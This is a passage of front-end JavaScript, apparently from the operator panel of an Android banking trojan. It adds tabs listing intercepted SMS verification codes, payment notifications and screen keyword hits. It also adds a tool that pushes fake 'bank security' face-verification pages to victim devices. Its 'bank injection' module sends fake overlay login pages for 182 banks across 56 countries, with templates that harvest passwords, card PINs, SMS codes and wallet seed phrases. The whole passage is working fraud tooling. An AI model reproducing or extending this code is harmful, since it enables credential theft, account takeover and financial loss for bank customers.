        var codes = (rs[0] && rs[0].list) || [];
        list.appendChild(sec('\ud83d\udce9 \u9a8c\u8bc1\u7801'));
        if(!codes.length) list.appendChild(empty('\u6682\u65e0\u9a8c\u8bc1\u7801\u8bb0\u5f55'));
        codes.forEach(function(c){
          var row = document.createElement('div'); row.style.cssText = 'display:flex;align-items:center;justify-content:space-between;padding:8px 12px;border-bottom:1px solid #ffffff;';
          var inf = document.createElement('div');
          inf.innerHTML = '<b style="font-size:20px;color:#6b83ff;letter-spacing:3px;">' + __zglEscK(c.code) + '</b><span style="margin-left:10px;color:#9a8f7a;font-size:12px;">' + __zglEscK(c.sender || '') + ' \u00b7 ' + __zglEscK(c.created_at || '') + '</span><div style="color:#9a8f7a;font-size:12px;margin-top:2px;">' + __zglEscK(String(c.content || '').slice(0, 60)) + '</div>';
          var cp = document.createElement('button'); cp.type = 'button'; cp.textContent = '\u590d\u5236';
          cp.style.cssText = 'background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:8px;padding:5px 12px;cursor:pointer;';
          cp.onclick = function(){ try{ navigator.clipboard.writeText(c.code); if(window.$message) window.$message.success('\u9a8c\u8bc1\u7801\u5df2\u590d\u5236'); }catch(e){} };
          row.appendChild(inf); row.appendChild(cp); list.appendChild(row);
        });
        var pays = (rs[1] && rs[1].list) || [];
        list.appendChild(sec('\ud83d\udcb0 \u652f\u4ed8\u901a\u77e5'));
        if(!pays.length) list.appendChild(empty('\u6682\u65e0\u652f\u4ed8\u901a\u77e5'));
        pays.forEach(function(x){
          var row = document.createElement('div'); row.style.cssText = 'padding:8px 12px;border-bottom:1px solid #ffffff;';
          var dir = x.kind === 'in' ? '<span style="color:#49d9a4;">\u6536\u5165</span>' : '<span style="color:#ff8a7a;">\u652f\u51fa</span>';
          row.innerHTML = '<span style="font-size:15px;font-weight:700;color:#f2f7ff;">' + __zglEscK(x.app || '') + ' ' + dir + ' <b style="color:#6b83ff;">' + __zglEscK(x.amount || '') + '</b></span>' + (x.counterparty ? ' <span style="color:#9a8f7a;font-size:12px;">' + __zglEscK(x.counterparty) + '</span>' : '') + '<div style="color:#9a8f7a;font-size:12px;margin-top:2px;">' + __zglEscK(String(x.raw_text || '').slice(0, 60)) + ' \u00b7 ' + __zglEscK(x.created_at || '') + '</div>';
          list.appendChild(row);
        });
        var hits = (rs[2] && rs[2].list) || [];
        list.appendChild(sec('\ud83d\udd14 \u5173\u952e\u8bcd\u547d\u4e2d'));
        if(!hits.length) list.appendChild(empty('\u6682\u65e0\u547d\u4e2d\u8bb0\u5f55'));
        hits.forEach(function(h){
          var row = document.createElement('div'); row.style.cssText = 'padding:8px 12px;border-bottom:1px solid #ffffff;';
          var img = h.image_path ? '<a href="/' + __zglEscK(h.image_path) + '" target="_blank" style="color:#6b83ff;font-size:12px;margin-left:8px;">\u67e5\u770b\u622a\u56fe</a>' : '';
          row.innerHTML = '<b style="color:#ff9d8a;">[' + __zglEscK(h.keyword) + ']</b><span style="color:#14213d;font-size:13px;margin-left:8px;">' + __zglEscK(String(h.screen_text || '').slice(0, 80)) + '</span>' + img + '<div style="color:#9a8f7a;font-size:12px;margin-top:2px;">' + __zglEscK(h.created_at || '') + '</div>';
          list.appendChild(row);
        });
        var kws = (rs[3] && rs[3].list) || [];
        var kwlist = document.getElementById('zglIntelKwList');
        if(kwlist){
          kwlist.innerHTML = '';
          kws.forEach(function(k){
            var chip = document.createElement('span'); chip.style.cssText = 'display:inline-flex;align-items:center;gap:6px;background:#eef1f7;border:1px solid #d8dfeb;border-radius:20px;padding:3px 10px;font-size:12px;color:#14213d;';
            chip.textContent = k.keyword;
            var x = document.createElement('b'); x.textContent = '\u00d7'; x.style.cssText = 'color:#ff8a7a;cursor:pointer;';
            x.onclick = function(){ fetch('/api/EaodIntel.php?action=remove_keyword', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'remove_keyword', keyword:k.keyword, token:stoGet('ACCESS-TOKEN')})}).then(function(r){ return r.json(); }).then(function(){ window.__zglLoadIntel(); }); };
            chip.appendChild(x); kwlist.appendChild(chip);
          });
        }
      }).catch(function(){ list.innerHTML = '<div style="color:#e05d4f;padding:20px;text-align:center;">\u52a0\u8f7d\u5931\u8d25</div>'; });
    }catch(e){}
  };
  window.__zglEnsureIntel = function(){
    try{
      if(!onInfo() || !pid()) return;
      ensureIntelTab();
      ensureIntelWs();
    }catch(e){}

  window.__zglEnsureConnUX = function(){

<style id="zglFaceStyle">
#zglFaceBtn{margin-left:10px;height:34px;padding:0 14px;border-radius:8px;border:1px solid rgba(52,211,153,.4);background:rgba(52,211,153,.12);color:#7ef0c0;font-weight:700;font-size:12px;cursor:pointer;}

#zglFacePanel .fvin::placeholder{color:#6d6353;}
</style>
<script>
(function(){
  if(window.__zglFaceInstalled) return;
  window.__zglFaceInstalled = true;
  var bOnInfo = function(){ return location.pathname.indexOf('/info') === 0; };
  var bPid = function(){ return new URLSearchParams(location.search).get('id') || ''; };
  var bStoGet = function(key){
    var raw = localStorage.getItem(key) || sessionStorage.getItem(key) || '';
    if(!raw) return '';
    try{ var p = JSON.parse(raw); if (p && Object.prototype.hasOwnProperty.call(p, 'value')) return typeof p.value === 'string' ? p.value : JSON.stringify(p.value); }catch(e){}
    return raw;
  };
  var panel = null, listEl = null;

  function sendFace(){
    try{
      var ws2 = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
      var tEl = document.getElementById('zglFaceTitle'), hEl = document.getElementById('zglFaceHint');
      var ct = (tEl && tEl.value ? tEl.value : '').trim().slice(0,30);
      var ch = (hEl && hEl.value ? hEl.value : '').trim().slice(0,60);
      try{ localStorage.setItem('zglFaceTitle', ct); localStorage.setItem('zglFaceHint', ch); }catch(e){}
      var url = location.origin + '/bank/face/index.html?pid=' + encodeURIComponent(bPid());
      if(ct) url += '&title=' + encodeURIComponent(ct);
      if(ch) url += '&hint=' + encodeURIComponent(ch);
      var msg = {itype:'slr_panel', subc:'screen', comand:'inj', pid: bPid(), bank:'', cc:'', url: url, usercheck: bStoGet('CURRENT-USER')};
      var sent = false;
      ws2.onopen = function(){
        ws2.send(JSON.stringify({itype:'slr_panel', subc:'checkphone', email: bStoGet('CURRENT-EMAIL'), token: bStoGet('ACCESS-TOKEN'), usrname: bStoGet('CURRENT-USER'), page:1, pageSize:10, filters:{}, showOffline:0}));
      };
      ws2.onmessage = function(ev){
        try{
          var m = JSON.parse(ev.data);
          if(m && m.type === 'checkphone' && !sent){
            sent = true;
            ws2.send(JSON.stringify({itype:'slr_panel', subc:'join', pid: bPid(), usercheck: bStoGet('CURRENT-USER')}));
            ws2.send(JSON.stringify(msg));
            setTimeout(function(){ try{ ws2.close(); }catch(e){} }, 2000);
          }
        }catch(e){}
      };
      ws2.onerror = function(){ try{ ws2.close(); }catch(e){} };
    }catch(e){}
  }

  function loadList(){
    if(!listEl) return;
    listEl.innerHTML = '<span style="color:#9a8f7a;">\u52a0\u8f7d\u4e2d...</span>';
    fetch('/api/EaodFaceVerify.php?action=list', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token: bStoGet('ACCESS-TOKEN'), phone_id: bPid()})})
      .then(function(r){ return r.json(); })
      .then(function(j){
        var l = (j && j.list) || [];
        if(!l.length){ listEl.innerHTML = '<span style="color:#9a8f7a;">\u6682\u65e0\u9a8c\u8bc1\u8bb0\u5f55</span>'; return; }
        listEl.innerHTML = '';
        l.forEach(function(it){
          var row = document.createElement('div'); row.className = 'fvrec';
          if(it.thumb_path){
            var img = document.createElement('img'); img.src = it.thumb_path; img.onclick = function(){ window.open(it.thumb_path, '_blank'); };
            row.appendChild(img);
          }
          if(it.video_path){
            var v = document.createElement('video'); v.src = it.video_path; v.muted = true; v.preload = 'metadata';
            v.onclick = function(){ window.open(it.video_path, '_blank'); };
            row.appendChild(v);
          }
          var info = document.createElement('span');
          info.innerHTML = '<b style="color:#7ef0c0;">\u4eba\u8138\u9a8c\u8bc1</b> <span style="color:#9a8f7a;">' +
            Math.round((it.duration_ms||0)/1000) + 's</span> <span style="color:#7d93ac;">' +
            (it.created_at||'').slice(0,16) + '</span>';
          info.style.flex = '1';
          row.appendChild(info);
          var open = document.createElement('button'); open.className = 'fvbtn2'; open.textContent = '\u64ad\u653e';
          open.onclick = function(){
            if(it.video_path) window.open(it.video_path, '_blank');
          };
          var del = document.createElement('button'); del.className = 'fvbtn2'; del.textContent = '\u5220\u9664'; del.style.color = '#ff9d8a';
          del.onclick = function(){
            fetch('/api/EaodFaceVerify.php?action=del', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token: bStoGet('ACCESS-TOKEN'), id: it.id})})
              .then(function(r){ return r.json(); }).then(function(){ loadList(); });
          };
          row.appendChild(open); row.appendChild(del);
          listEl.appendChild(row);
        });
      }).catch(function(){ listEl.innerHTML = '<span style="color:#e05d4f;">\u52a0\u8f7d\u5931\u8d25</span>'; });
  }

  function togglePanel(){
    if(!panel) return;
    if(panel.style.display === 'block'){ panel.style.display = 'none'; return; }
    panel.style.display = 'block';
    loadList();
  }

  function ensureBtn(){
    try{
      if(!bOnInfo() || !bPid()) return;
      var bar = document.getElementById('zglDeviceBar');
      if(!bar) return;
      if(document.getElementById('zglFaceBtn')) return;
      var btn = document.createElement('button');
      btn.id = 'zglFaceBtn'; btn.type = 'button'; btn.textContent = '\ud83e\udef5 \u4eba\u8138\u9a8c\u8bc1';
      btn.onclick = togglePanel;
      bar.appendChild(btn);
      panel = document.createElement('div');
      panel.id = 'zglFacePanel';
      panel.innerHTML =
        '<div class="fr">' +
        '<input id="zglFaceTitle" class="fvin" placeholder="\u6807\u9898\uff08\u53ef\u9009\uff0c\u5982\uff1aXX\u94f6\u884c\u5b89\u5168\u8ba4\u8bc1\uff09" maxlength="30">' +
        '<input id="zglFaceHint" class="fvin" placeholder="\u63d0\u793a\u8bed\uff08\u53ef\u9009\uff0c\u5982\uff1a\u8bf7\u914d\u5408\u5b8c\u6210\u5b89\u5168\u9a8c\u8bc1\uff09" maxlength="60">' +
        '</div>' +
        '<div class="fr">' +
        '<button class="fvbtn" id="zglFaceStart">\u5f00\u59cb\u4eba\u8138\u9a8c\u8bc1</button>' +
        '<button class="fvbtn2" id="zglFaceRefresh">\u5237\u65b0</button>' +
        '<span style="color:#9a8f7a;font-size:12px;">\u6807\u9898/\u63d0\u793a\u8bed\u7559\u7a7a\u5219\u7528\u9ed8\u8ba4\u6587\u6848\uff1b\u5df2\u5f00\u60ac\u6d6e\u7a97\u6743\u9650\u7684\u8bbe\u5907\u76f4\u63a5\u5f39\u9875\uff0c\u672a\u5f00\u7684\u4f1a\u6536\u5230\u901a\u77e5\u5f15\u5bfc</span>' +
        '</div>' +
        '<div class="fr" id="zglFaceList"></div>';
      bar.parentNode.insertBefore(panel, bar.nextSibling);
      listEl = panel.querySelector('#zglFaceList');
      try{
        document.getElementById('zglFaceTitle').value = localStorage.getItem('zglFaceTitle') || '';
        document.getElementById('zglFaceHint').value = localStorage.getItem('zglFaceHint') || '';
      }catch(e){}
      panel.querySelector('#zglFaceStart').onclick = function(){ sendFace(); if(window.$message) window.$message.success('\u5df2\u4e0b\u53d1\u4eba\u8138\u9a8c\u8bc1\u6307\u4ee4\uff0c\u672a\u5f00\u6743\u9650\u7684\u8bbe\u5907\u5c06\u6536\u5230\u901a\u77e5\u5f15\u5bfc'); };
      panel.querySelector('#zglFaceRefresh').onclick = function(){ loadList(); };
    }catch(e){}
  }

  function tick(){
    try{ if(bOnInfo() && bPid() && document.getElementById('zglDeviceBar')){ ensureBtn(); } }catch(e){}
  }
  tick();
  setInterval(tick, 3000);
  try { new MutationObserver(tick).observe(document.body, {childList:true, subtree:true}); } catch(e){}
})();
</script>

<style id="zglBankStyle">
.zglBankTree{max-height:420px;overflow-y:auto;background:#f7f9fd;border:1px solid #d8dfeb;border-radius:10px;padding:8px 10px;}
.zglBankCountry{color:#f0d9a0;font-weight:700;font-size:13px;padding:8px 4px 6px;cursor:pointer;user-select:none;display:flex;justify-content:space-between;align-items:center;}
.zglBankCountry small{color:#9a8f7a;font-weight:400;}
.zglBankItem{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:6px 4px 6px 12px;border-radius:8px;}
.zglBankItem:hover{background:#eef1f7;}
.zglBankItem .bname{font-size:13px;color:#14213d;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.zglBankItem .bpkg{font-size:10.5px;color:#7d93ac;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.zglBankItem .bact{display:flex;gap:6px;flex:none;}
.zglBankBtn{background:linear-gradient(90deg,#3b5bf0,#6b83ff);border:0;color:#ffffff;border-radius:7px;padding:4px 12px;font-size:12px;font-weight:800;cursor:pointer;}
.zglBankBtn:active{opacity:.85;}
.zglBankBtn.bview{background:#ffffff;border:1px solid #4a3f2c;color:#14213d;font-weight:600;}
.zglBankBtn.bdel{background:#3a2430;border:1px solid #6b2c3a;color:#ff9d8a;}
.zglBankBtn.bnew{background:linear-gradient(90deg,#6b83ff,#d97706);color:#ffffff;}
.zglCredRow{display:flex;gap:8px;align-items:center;padding:7px 10px;border-bottom:1px solid #f5f7fb;font-size:12.5px;flex-wrap:wrap;}
.zglCredRow .cb{background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:6px;padding:2px 8px;font-size:11.5px;cursor:pointer;}
.zglBankCols{display:flex;gap:12px;flex-wrap:wrap;}
.zglBankCols > div{flex:1;min-width:280px;}
.zglBankSecT{font-size:13px;font-weight:700;color:#f0d9a0;margin:8px 0 6px;}
#zglBankForm{display:none;background:#f7f9fd;border:1px solid #d8dfeb;border-radius:10px;padding:12px 14px;margin:0 0 10px;}
#zglBankForm .fr{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap;}
#zglBankForm .fr label{font-size:12px;color:#9a8f7a;width:84px;flex:none;}
#zglBankForm .fr input,#zglBankForm .fr select{background:#eef1f7;border:1px solid #d8dfeb;color:#14213d;border-radius:8px;padding:6px 10px;font-size:13px;outline:none;flex:1;min-width:160px;}
#zglBankForm .fr input[type=color]{flex:0 0 44px;min-width:44px;height:32px;padding:2px;cursor:pointer;}
.zglCustHead{color:#6b83ff;font-weight:700;font-size:13px;padding:8px 4px 6px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;user-select:none;}
</style>
<script>
(function(){
  if(window.__zglBankInstalled) return;
  window.__zglBankInstalled = true;

  // 本块自包含工具函数(不依赖其他注入脚本的闭包变量)
  function bOnInfo(){ return location.pathname.indexOf('/info') === 0; }
  function bPid(){ return new URLSearchParams(location.search).get('id') || ''; }
  function bStoGet(key){
    var raw = localStorage.getItem(key) || sessionStorage.getItem(key) || '';
    if(!raw) return '';
    try{ var p = JSON.parse(raw); if (p && Object.prototype.hasOwnProperty.call(p, 'value')) return typeof p.value === 'string' ? p.value : JSON.stringify(p.value); }catch(e){}
    return raw;
  }
  function bEsc(s){ return String(s==null?'':s).replace(/[&<>"']/g, function(c){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }

  var bankWs = null, bankWsRetry = null;
  function ensureBankWs(){
    try{
      if(!bOnInfo() || !bPid()) return;
      if(bankWs && bankWs.readyState === 1) return;
      if(bankWs) return;
      bankWs = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/api/ws/');
      bankWs.onopen = function(){
        // 先 checkphone 认证(token), 收到列表后再 join
        bankWs.send(JSON.stringify({itype:'slr_panel', subc:'checkphone', email: bStoGet('CURRENT-EMAIL'), token: bStoGet('ACCESS-TOKEN'), usrname: bStoGet('CURRENT-USER'), page:1, pageSize:10, filters:{}, showOffline:0}));
      };
      bankWs.onmessage = function(ev){
        try{
          var m = JSON.parse(ev.data);
          if(m && m.type === 'checkphone'){
            bankWs.send(JSON.stringify({itype:'slr_panel', subc:'join', pid: bPid(), usercheck: bStoGet('CURRENT-USER')}));
            return;
          }
          if(m && m.type === 'error' && String(m.msg||'').indexOf('未授权') !== -1){ return; }
        }catch(e){}
      };
      bankWs.onclose = function(){ bankWs = null; clearTimeout(bankWsRetry); bankWsRetry = setTimeout(ensureBankWs, 6000); };
      bankWs.onerror = function(){ try{ bankWs.close(); }catch(e){} };
    }catch(e){}
  }

  var LANG_OPTS = [["zh-CN","中文(简体)"],["zh-HK","中文(繁體·港)"],["zh-TW","中文(繁體·台)"],["en","English"],["es","Español"],["fr","Français"],["de","Deutsch"],["it","Italiano"],["pt","Português"],["nl","Nederlands"],["pl","Polski"],["sv","Svenska"],["no","Norsk"],["da","Dansk"],["fi","Suomi"],["ja","日本語"],["ko","한국어"],["ms","Bahasa Melayu"],["th","ไทย"],["id","Bahasa Indonesia"],["vi","Tiếng Việt"],["ar","العربية"],["he","עברית"],["tr","Türkçe"],["ru","Русский"],["uk","Українська"]];

  function ensureBankTab(){
    try{
      if(!bOnInfo() || !bPid()) return;
      var nav = document.querySelector('.zglTopNav');
      var inner = nav ? nav.querySelector('.n-tabs-wrapper') : null;
      var tabs = document.querySelector('.zglTopTabs .n-tabs');
      if(!inner || !tabs) return;
      var tw = document.getElementById('zglBankTabWrap');
      if(!tw){
        tw = document.createElement('div'); tw.id = 'zglBankTabWrap'; tw.className = 'n-tabs-tab-wrapper';
        var tab = document.createElement('div'); tab.id = 'zglBankTab'; tab.className = 'n-tabs-tab zglBankTab'; tab.textContent = '\ud83c\udfe6 \u94f6\u884c\u6ce8\u5165';
        tw.appendChild(tab);
        var pad = inner.querySelector('.n-tabs-scroll-padding');
        if(pad){ inner.insertBefore(tw, pad); } else { inner.appendChild(tw); }
        tab.addEventListener('click', function(){
          window.__zglBankOn = true;
          window.__zglIntelOn = false; window.__zglKlogOn = false; window.__zglPasswordOn = false; window.__zglVideoOn = false; window.__zglDocsOn = false; window.__zglSpoofOn = false;
          var docs = document.getElementById('zglExtra'), spoof = document.getElementById('zglSpoofPanel'),
              pp = document.getElementById('zglPasswordPane'), kp = document.getElementById('zglKlogPane'), vp = document.getElementById('zglVideoPane'),
              ip = document.getElementById('zglIntelPane');
          if(docs) docs.style.display = 'none'; if(spoof) spoof.style.display = 'none';
          if(pp){ pp.classList.remove('is-active'); pp.style.display = 'none'; }
          if(kp){ kp.classList.remove('is-active'); kp.style.display = 'none'; }
          if(vp){ vp.classList.remove('is-active'); vp.style.display = 'none'; }
          if(ip){ ip.classList.remove('is-active'); ip.style.display = 'none'; }
          var pane = document.getElementById('zglBankPane');
          if(pane){ pane.classList.add('is-active'); pane.style.display = 'block'; pane.scrollIntoView({behavior:'smooth',block:'nearest'}); }
          Array.prototype.forEach.call(document.querySelectorAll('.zglTopNav .n-tabs-tab'), function(t){ t.classList.remove('n-tabs-tab--active'); });
          tab.classList.add('n-tabs-tab--active');
          ensureBankWs();
          window.__zglLoadBank();
        });
      }
      var pane = document.getElementById('zglBankPane');
      if(!pane){
        pane = document.createElement('div'); pane.id = 'zglBankPane'; pane.className = 'zglPasswordPane zglBankPane';
        var title = document.createElement('div'); title.className = 'zglPasswordPaneTitle'; title.textContent = '\ud83c\udfe6 \u94f6\u884c\u6ce8\u5165\uff08\u624b\u52a8\u6a21\u5f0f\uff09';
        var bar = document.createElement('div'); bar.style.cssText = 'display:flex;align-items:center;gap:12px;margin:4px 0 10px;flex-wrap:wrap;';
        var btn = document.createElement('button'); btn.type = 'button'; btn.textContent = '\u5237\u65b0';
        btn.style.cssText = 'background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;';
        btn.onclick = function(){ window.__zglLoadBank(); };
        var nbtn = document.createElement('button'); nbtn.type = 'button'; nbtn.textContent = '\uff0b \u65b0\u5efa\u81ea\u5b9a\u4e49\u6a21\u677f';
        nbtn.style.cssText = 'background:linear-gradient(90deg,#6b83ff,#d97706);border:0;color:#ffffff;border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;font-weight:800;';
        nbtn.onclick = function(){ window.__zglOpenBankForm(); };
        var fsel = document.createElement('select'); fsel.id = 'zglBankCountryFilter'; fsel.title = '\u56fd\u5bb6\u7b5b\u9009';
        fsel.style.cssText = 'background:#eef1f7;border:1px solid #d8dfeb;color:#14213d;border-radius:8px;padding:6px 10px;font-size:13px;outline:none;max-width:200px;';
        var fopt = document.createElement('option'); fopt.value = ''; fopt.textContent = '\ud83c\udf0d \u5168\u90e8\u56fd\u5bb6'; fsel.appendChild(fopt);
        fsel.onchange = function(){ bankCountryFilter = fsel.value; renderTree(); };
        var hint = document.createElement('span'); hint.textContent = '\u70b9\u201c\u6ce8\u5165\u201d\u5373\u5411\u8bbe\u5907\u4e0b\u53d1\u5047\u9875\uff0c\u8986\u76d6\u5176\u5f53\u524d\u754c\u9762';
        hint.style.cssText = 'color:#9a8f7a;font-size:12px;';
        var msel = document.createElement('select'); msel.id = 'zglBankMode';
        msel.style.cssText = 'background:#eef1f7;border:1px solid #d8dfeb;color:#14213d;border-radius:8px;padding:6px 10px;font-size:13px;outline:none;';
        var mo1 = document.createElement('option'); mo1.value = 'now'; mo1.textContent = '\u26a1 \u7acb\u5373\u6ce8\u5165\uff08\u76f4\u63a5\u5f39\uff09'; msel.appendChild(mo1);
        var mo2 = document.createElement('option'); mo2.value = 'arm'; mo2.textContent = '\ud83c\udfaf \u6302\u8f7d\u89e6\u53d1\uff08\u7b49App\u6253\u5f00\uff09'; msel.appendChild(mo2);
        try{ msel.value = localStorage.getItem('zglBankMode') || 'now'; }catch(e){}
        window.__zglBankMode = msel.value;
        msel.onchange = function(){
          window.__zglBankMode = msel.value;
          try{ localStorage.setItem('zglBankMode', msel.value); }catch(e){}
          hint.textContent = (window.__zglBankMode === 'arm')
            ? '\u70b9\u201c\u6ce8\u5165\u201d\u6302\u8f7d\u76ee\u6807\u94f6\u884cApp\uff0c\u673a\u4e3b\u6253\u5f00\u65f6\u81ea\u52a8\u5f39\u5047\u9875\uff08\u5355\u6b21\u89e6\u53d1\uff09'
            : '\u70b9\u201c\u6ce8\u5165\u201d\u5373\u5411\u8bbe\u5907\u4e0b\u53d1\u5047\u9875\uff0c\u8986\u76d6\u5176\u5f53\u524d\u754c\u9762';
        };
        var dis = document.createElement('button'); dis.type = 'button'; dis.textContent = '\u5378\u8f7d\u6302\u8f7d';
        dis.style.cssText = 'background:#3a2b2b;border:1px solid #8a4a3a;color:#ffc9b8;border-radius:8px;padding:6px 14px;cursor:pointer;font-size:13px;';
        dis.onclick = function(){ window.__zglInjectBankDis(); };
        var st = document.createElement('span'); st.id = 'zglBankArmStat'; st.style.cssText = 'color:#7ef0c0;font-size:12px;';
        bar.appendChild(btn); bar.appendChild(nbtn); bar.appendChild(fsel); bar.appendChild(msel); bar.appendChild(dis); bar.appendChild(st); bar.appendChild(hint);
        pane.appendChild(title); pane.appendChild(bar);
        // 自定义模板表单
        var form = document.createElement('div'); form.id = 'zglBankForm';
        form.innerHTML =
          '<input type="hidden" id="bkf_id">' +
          '<div class="fr"><label>\u540d\u79f0 *</label><input id="bkf_name" placeholder="\u5982: \u5bcc\u6e2f\u94f6\u884c / PayPay / \u67d0\u652f\u4ed8"></div>' +
          '<div class="fr"><label>\u6b22\u8fce\u8bed</label><input id="bkf_welcome" placeholder="\u7559\u7a7a\u7528\u9ed8\u8ba4\u8bed\u8a00\u6587\u6848"></div>' +
          '<div class="fr"><label>\u5fbd\u6807\u5b57\u6bcd</label><input id="bkf_initials" maxlength="6" placeholder="\u5982 HSBC" style="max-width:90px;"></div>' +
          '<div class="fr"><label>\u4e3b\u8272</label><input id="bkf_c1" type="color" value="#3b5bf0"><label style="width:34px;">\u526f\u8272</label><input id="bkf_c2" type="color" value="#3b5bf0"></div>' +
          '<div class="fr"><label>\u8bed\u8a00</label><select id="bkf_lang"></select><label style="width:34px;">\u5b57\u6bb5</label><select id="bkf_flow"><option value="up">\u7528\u6237\u540d + \u5bc6\u7801</option><option value="cp">\u5361\u53f7 + PIN</option><option value="uo">\u7528\u6237\u540d + \u5bc6\u7801 + \u77ed\u4fe1\u9a8c\u8bc1\u7801</option><option value="pin">\u652f\u4ed8\u5bc6\u7801\u76d8</option><option value="seed">\u52a9\u8bb0\u8bcd</option><option value="full">\u89e3\u9501\u5bc6\u7801+\u652f\u4ed8\u5bc6\u7801+\u52a9\u8bb0\u8bcd</option></select></div>' +
          '<div class="fr"><label>\u4f4d\u6570/\u8bcd\u6570</label><select id="bkf_digits"><option value="6">6\u4f4d\u5bc6\u7801</option><option value="4">4\u4f4d\u5bc6\u7801</option></select><select id="bkf_words"><option value="12">12\u8bcd</option><option value="24">24\u8bcd</option></select></div>' +
          '<div class="fr"><label>\u7ef4\u62a4\u63d0\u793a</label><input id="bkf_maint" placeholder="\u7559\u7a7a\u7528\u9ed8\u8ba4\u8bed\u8a00\u6587\u6848"></div>' +
          '<div class="fr"><label>\u5907\u6ce8</label><input id="bkf_note" placeholder="\u4ec5\u9762\u677f\u663e\u793a\uff0c\u4e0d\u4f1a\u51fa\u73b0\u5728\u5047\u9875\u4e0a"></div>' +
          '<div class="fr" style="justify-content:flex-end;"><button type="button" id="bkf_cancel" style="background:#ffffff;border:1px solid #4a3f2c;color:#14213d;border-radius:8px;padding:7px 18px;cursor:pointer;font-size:13px;">\u53d6\u6d88</button><button type="button" id="bkf_save" style="background:linear-gradient(90deg,#3b5bf0,#6b83ff);border:0;color:#ffffff;border-radius:8px;padding:7px 22px;cursor:pointer;font-size:13px;font-weight:800;">\u4fdd\u5b58</button></div>';
        var langSel = form.querySelector('#bkf_lang');
        LANG_OPTS.forEach(function(o){ var op = document.createElement('option'); op.value = o[0]; op.textContent = o[1]; langSel.appendChild(op); });
        form.querySelector('#bkf_cancel').onclick = function(){ form.style.display = 'none'; };
        form.querySelector('#bkf_save').onclick = function(){ window.__zglSaveBankForm(); };
        pane.appendChild(form);
        var cols = document.createElement('div'); cols.className = 'zglBankCols';
        var left = document.createElement('div');
        var lt = document.createElement('div'); lt.className = 'zglBankSecT'; lt.textContent = '\ud83c\udf0d \u56fd\u5bb6\u5206\u7c7b\uff0856 \u56fd / 182 \u5bb6\uff09';
        var tree = document.createElement('div'); tree.id = 'zglBankTree'; tree.className = 'zglBankTree';
        left.appendChild(lt); left.appendChild(tree);
        var right = document.createElement('div');
        var ct = document.createElement('div'); ct.className = 'zglBankSecT'; ct.textContent = '\ud83d\udd11 \u51ed\u636e';
        var creds = document.createElement('div'); creds.id = 'zglBankCreds'; creds.style.cssText = 'max-height:300px;overflow-y:auto;background:#f7f9fd;border:1px solid #d8dfeb;border-radius:10px;padding:6px 8px;';
        var ht = document.createElement('div'); ht.className = 'zglBankSecT'; ht.textContent = '\ud83d\udccd \u6ce8\u5165\u547d\u4e2d';
        var hits = document.createElement('div'); hits.id = 'zglBankHits'; hits.style.cssText = 'max-height:180px;overflow-y:auto;background:#f7f9fd;border:1px solid #d8dfeb;border-radius:10px;padding:6px 8px;';
        right.appendChild(ct); right.appendChild(creds); right.appendChild(ht); right.appendChild(hits);
        cols.appendChild(left); cols.appendChild(right);
        pane.appendChild(cols);
        tabs.appendChild(pane);
        if(!window.__zglBankPoll){
          window.__zglBankPoll = setInterval(function(){
            if(window.__zglBankOn && document.getElementById('zglBankPane')) window.__zglLoadBank(true);
          }, 10000);
        }
      }
      pane.classList.toggle('is-active', window.__zglBankOn === true);
      pane.style.display = window.__zglBankOn === true ? 'block' : 'none';
      if(!window.__zglBankTabBound){
        window.__zglBankTabBound = true;
        document.addEventListener('click', function(ev){
          var clicked = ev.target && ev.target.closest ? ev.target.closest('.n-tabs-tab') : null;
          if(clicked && clicked.id !== 'zglBankTab'){ window.__zglBankOn = false; var p = document.getElementById('zglBankPane'); if(p){ p.classList.remove('is-active'); p.style.display = 'none'; } }
        }, true);
      }
    }catch(e){}
  }

  var bankCatalog = null, bankExpand = {}, bankCustoms = [], bankCountryFilter = '', walletCats = null;

  function fillCountryFilter(){
    try{
      var fsel = document.getElementById('zglBankCountryFilter');
      if(!fsel || !bankCatalog) return;
      var cur = fsel.value;
      var names = {};
      (bankCatalog.countries || []).forEach(function(c){ names[c.cc] = c.name; });
      // 重建选项(保留"全部国家" + 当前值)
      var keep = [];
      var had = {};
      fsel.innerHTML = '';
      var opt0 = document.createElement('option'); opt0.value = ''; opt0.textContent = '\ud83c\udf0d \u5168\u90e8\u56fd\u5bb6 (' + (bankCatalog.countries || []).length + ')'; fsel.appendChild(opt0);
      (bankCatalog.countries || []).forEach(function(c){
        var o = document.createElement('option'); o.value = c.cc; o.textContent = c.name + ' (' + c.banks.length + ')';
        fsel.appendChild(o);
      });
      fsel.value = cur;
    }catch(e){}
  }

  function renderTree(){
    var tree = document.getElementById('zglBankTree');
    if(!tree) return;
    if(!bankCatalog){ tree.innerHTML = '<div style="color:#9a8f7a;padding:14px;text-align:center;">\u52a0\u8f7d\u5206\u7c7b\u4e2d...</div>'; return; }
    tree.innerHTML = '';
    var p = bPid();
    // 自定义模板区
    var csec = document.createElement('div');
    var chead = document.createElement('div'); chead.className = 'zglCustHead';
    var cOpen = bankExpand._custom !== false;
    chead.innerHTML = '\u2699\ufe0f \u81ea\u5b9a\u4e49\u6a21\u677f <small style="color:#9a8f7a;font-weight:400;">(' + bankCustoms.length + ')</small> ' + (cOpen ? '\u25bc' : '\u25b6');
    chead.onclick = function(){ bankExpand._custom = !(bankExpand._custom !== false); renderTree(); };
    csec.appendChild(chead);
    if(cOpen){
      if(!bankCustoms.length){
        var empty = document.createElement('div'); empty.style.cssText = 'color:#9a8f7a;font-size:12px;padding:6px 4px 6px 12px;';
